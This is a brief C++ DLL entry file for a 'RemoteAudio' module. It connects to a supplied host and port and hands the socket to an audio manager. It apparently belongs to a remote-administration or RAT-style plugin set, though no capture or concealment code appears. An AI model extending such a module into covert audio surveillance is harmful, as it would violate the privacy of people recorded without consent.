// RemoteAudio.cpp : Defines the entry point for the DLL application.
//

#include "pcl.h"
#include "AudioManager.h"
#include "../Dllcomment/ClientSocket.h"
extern "C" __declspec(dllexport) bool Main(LPCTSTR lpszHost, UINT nPort,LPBYTE blparam)
{
	
	
	CClientSocket	socketClient;
	if (!socketClient.Connect(lpszHost, nPort))
		return -1;
	
	CAudioManager	manager(&socketClient);
	
	socketClient.run_event_loop();
	
	return 0;
}

extern "C" __declspec(dllexport) char * Version()//SOCKET sRemote)
{	
	return "Audio v1.0";
}
